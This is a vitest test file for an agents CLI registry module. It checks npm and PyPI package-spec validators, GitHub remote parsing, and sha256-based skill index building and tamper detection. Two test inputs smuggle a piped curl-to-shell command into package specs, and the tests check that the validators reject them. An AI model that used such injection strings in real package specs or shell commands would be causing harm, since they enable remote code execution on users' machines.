import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { createHash } from 'crypto';
import { afterEach, describe, expect, it } from 'vitest';
import {
  validatedNpmSpec,
  validatedPyPISpec,
  buildSkillIndex,
  verifySkillIntegrity,
  normalizeSkillEntry,
  parseOwnerRepoFromRemote,
  sha256OfFile,
} from './registry.js';

describe('registry package spec validators', () => {
  it('accepts valid npm package specs', () => {
    expect(validatedNpmSpec('@scope/package-name@1.2.3')).toBe('@scope/package-name@1.2.3');
  });

  it('rejects shell metacharacters in npm package specs', () => {
    expect(() => validatedNpmSpec('evil; curl x | sh')).toThrow('Invalid npm package spec');
  });

  it('accepts valid PyPI package specs', () => {
    expect(validatedPyPISpec('safe_package[extra]==1.2.3')).toBe('safe_package[extra]==1.2.3');
  });

  it('rejects shell metacharacters in PyPI package specs', () => {
    expect(() => validatedPyPISpec('evil$(curl x)')).toThrow('Invalid PyPI package spec');
  });
});

const tempDirs: string[] = [];

afterEach(() => {
  for (const dir of tempDirs.splice(0)) {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

function makeSkillRepo(skills: Record<string, string>): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-cli-publish-'));
  tempDirs.push(dir);
  for (const [name, description] of Object.entries(skills)) {
    const skillDir = path.join(dir, 'skills', name);
    fs.mkdirSync(skillDir, { recursive: true });
    fs.writeFileSync(
      path.join(skillDir, 'SKILL.md'),
      `---\nname: ${name}\ndescription: ${description}\n---\n\n# ${name}\n`,
      'utf-8'
    );
  }
  return dir;
}

describe('parseOwnerRepoFromRemote', () => {
  it('parses https + ssh + .git suffixed GitHub remotes', () => {
    expect(parseOwnerRepoFromRemote('https://github.com/acme/team-skills.git')).toBe('acme/team-skills');
    expect(parseOwnerRepoFromRemote('git@github.com:acme/team-skills.git')).toBe('acme/team-skills');
    expect(parseOwnerRepoFromRemote('https://github.com/acme/team-skills')).toBe('acme/team-skills');
  });

  it('returns null for non-GitHub remotes', () => {
    expect(parseOwnerRepoFromRemote('https://gitlab.com/acme/skills.git')).toBeNull();
  });
});

describe('buildSkillIndex', () => {
  it('indexes every skill with a matching sha256 of its SKILL.md', () => {
    const repo = makeSkillRepo({ alpha: 'First skill', beta: 'Second skill' });
    const index = buildSkillIndex(repo, 'acme/team-skills', { generatedAt: 'fixed' });

    expect(index.version).toBe(1);
    expect(index.generated_at).toBe('fixed');
    expect(index.skill_count).toBe(2);

    const byName = Object.fromEntries(index.skills.map((s) => [s.name, s]));
    expect(Object.keys(byName).sort()).toEqual(['alpha', 'beta']);

    const alpha = byName.alpha;
    expect(alpha.identifier).toBe('alpha');
    expect(alpha.repo).toBe('acme/team-skills');
    expect(alpha.path).toBe(path.join('skills', 'alpha'));
    expect(alpha.description).toBe('First skill');

    const expected = createHash('sha256')
      .update(fs.readFileSync(path.join(repo, 'skills', 'alpha', 'SKILL.md')))
      .digest('hex');
    expect(alpha.sha256).toBe(expected);
  });

  it('produces an empty index for a repo with no skills', () => {
    const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-cli-publish-empty-'));
    tempDirs.push(repo);
    const index = buildSkillIndex(repo, 'acme/empty');
    expect(index.skill_count).toBe(0);
    expect(index.skills).toEqual([]);
  });
});

describe('verifySkillIntegrity', () => {
  it('passes when the cloned SKILL.md matches the recorded sha256 (happy path)', () => {
    const repo = makeSkillRepo({ alpha: 'First skill' });
    const index = buildSkillIndex(repo, 'acme/team-skills');
    const entry = normalizeSkillEntry(index.skills[0]);

    const result = verifySkillIntegrity(repo, entry);
    expect(result.ok).toBe(true);
    expect(result.error).toBeUndefined();
  });

  it('fails when the SKILL.md is tampered after indexing (tamper path)', () => {
    const repo = makeSkillRepo({ alpha: 'First skill' });
    const index = buildSkillIndex(repo, 'acme/team-skills');
    const entry = normalizeSkillEntry(index.skills[0]);

    fs.writeFileSync(
      path.join(repo, 'skills', 'alpha', 'SKILL.md'),
      `---\nname: alpha\ndescription: First skill\n---\n\n# alpha\n\nmalicious payload\n`,
      'utf-8'
    );

    const result = verifySkillIntegrity(repo, entry);
    expect(result.ok).toBe(false);
    expect(result.error).toMatch(/Integrity check failed/);
    expect(result.error).toMatch(/refusing to install/);
  });

  it('fails when the SKILL.md is missing from the clone', () => {
    const repo = makeSkillRepo({ alpha: 'First skill' });
    const index = buildSkillIndex(repo, 'acme/team-skills');
    const entry = normalizeSkillEntry(index.skills[0]);
    fs.rmSync(path.join(repo, 'skills', 'alpha'), { recursive: true, force: true });

    const result = verifySkillIntegrity(repo, entry);
    expect(result.ok).toBe(false);
    expect(result.error).toMatch(/SKILL\.md not found/);
  });

  it('is a no-op (ok) when the entry carries no sha256 — older/third-party indexes', () => {
    const repo = makeSkillRepo({ alpha: 'First skill' });
    const result = verifySkillIntegrity(repo, { name: 'alpha', path: 'skills/alpha' });
    expect(result.ok).toBe(true);
  });
});

describe('normalizeSkillEntry', () => {
  it('passes sha256 through from the raw index row', () => {
    const entry = normalizeSkillEntry({
      name: 'alpha',
      description: 'First skill',
      repo: 'acme/team-skills',
      path: 'skills/alpha',
      sha256: 'a'.repeat(64),
    });
    expect(entry.sha256).toBe('a'.repeat(64));
    expect(entry.repo).toBe('acme/team-skills');
    expect(entry.path).toBe('skills/alpha');
  });

  it('leaves sha256 undefined when the raw row omits it', () => {
    const entry = normalizeSkillEntry({ name: 'alpha' });
    expect(entry.sha256).toBeUndefined();
  });
});

describe('sha256OfFile', () => {
  it('returns the lowercase hex digest of the file bytes', () => {
    const repo = makeSkillRepo({ alpha: 'First skill' });
    const file = path.join(repo, 'skills', 'alpha', 'SKILL.md');
    const expected = createHash('sha256').update(fs.readFileSync(file)).digest('hex');
    expect(sha256OfFile(file)).toBe(expected);
  });
});
